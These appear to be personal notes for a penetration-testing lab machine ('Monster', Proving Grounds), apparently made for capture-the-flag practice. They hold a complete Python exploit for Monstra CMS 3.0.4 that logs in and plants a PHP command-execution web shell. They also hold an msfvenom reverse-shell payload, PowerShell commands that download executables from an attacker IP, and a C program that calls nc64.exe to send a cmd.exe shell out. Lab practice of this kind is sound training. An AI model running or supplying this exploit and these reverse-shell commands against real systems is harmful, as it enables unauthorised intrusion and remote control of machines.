![[Pasted image 20260703224130.png]]


gobuster dir -u http://192.168.64.180 -w /usr/share/wordlists/dirb/big.txt

![[Pasted image 20260703224243.png]]
![[Pasted image 20260703224340.png]]

cewl http://192.168.64.180 | grep -v CeWL > wordlist.txt

![[Pasted image 20260703224507.png]]
![[Pasted image 20260703225018.png]]

wazowski

![[Pasted image 20260703225003.png]]![[Pasted image 20260703225116.png]]

```
#!/usr/bin/env python3
# Exploit Title: Monstra CMS 3.0.4 - Remote Code Execution (RCE)
# Date: 05.05.2024
# Exploit Author: Ahmet Ümit BAYRAM
# Fixed for CTF usage

import requests
import random
import string
import time
import re
import sys

if len(sys.argv) < 4:
    print("Usage: python3 script.py <url> <username> <password>")
    sys.exit(1)

base_url = sys.argv[1].rstrip('/')
username = sys.argv[2]
password = sys.argv[3]

session = requests.Session()

login_url = f'{base_url}/admin/index.php?id=dashboard'
login_data = {
    'login': username,
    'password': password,
    'login_submit': 'Log+In'
}

filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))

print("[+] Logging in...")
response = session.post(login_url, data=login_data, timeout=10)

if 'Dashboard' in response.text:
    print("[+] Login successful")
else:
    print("[-] Login failed")
    sys.exit(1)

time.sleep(2)

edit_url = f'{base_url}/admin/index.php?id=themes&action=add_chunk'
response = session.get(edit_url, timeout=10)

# More robust CSRF token extraction
token_search = re.search(r'input type="hidden" id="csrf" name="csrf" value="([^"]+)"', response.text)
if not token_search:
    token_search = re.search(r"input type='hidden' id='csrf' name='csrf' value='([^']+)'", response.text)

if token_search:
    token = token_search.group(1)
else:
    print("[-] CSRF token not found")
    sys.exit(1)

content = '''
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
    system($_GET['cmd']);
}
?>
</pre>
</body>
</html>
'''

edit_data = {
    'csrf': token,
    'name': filename,
    'content': content,
    'add_file': 'Save'
}

print("[+] Preparing shell...")
response = session.post(edit_url, data=edit_data, timeout=10)
time.sleep(2)

# Check if the chunk was added successfully
if 'Chunk <b>' + filename + '</b> saved' in response.text:
    shell_url = f'{base_url}/public/themes/default/{filename}.chunk.php'
    print(f"[+] Shell is ready: {shell_url}")
    print("[+] Example usage: {0}?cmd=id".format(shell_url))
else:
    print("[-] Failed to prepare shell. Check response:")
    print(response.text[:500])
```
https://medium.com/@ryanchamruiyang/monster-walkthrough-proving-grounds-by-ryan-cham-e1cda455cfc1

![[Pasted image 20260703225914.png]]

192.168.49.64

![[Pasted image 20260703230237.png]]
![[Pasted image 20260704014027.png]]

![[Pasted image 20260704014120.png]]

![[Pasted image 20260704014212.png]]

![[Pasted image 20260704014223.png]]


msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.64 LPORT=80 -f exe -o rev.exe


iwr http://192.168.49.64:/msf.ps1 -OutFile msf.ps1

Invoke-WebRequest http://192.168.49.64/rev.exe -OutFile rev.exe

iwr http://192.168.49.64/rev.exe -OutFile rev.exe

![[Pasted image 20260704014636.png]]
![[Pasted image 20260704015036.png]]


```
#include <stdlib.h>

int main(void){
     system("C:\\ProgramData\\nc64.exe 192.168.49.64 445 -e cmd.exe");
    return 0;
} 

```

---

![[Pasted image 20260704020825.png]]


https://www.re-x.org/articles/monster-proving-grounds ( privesc parts works )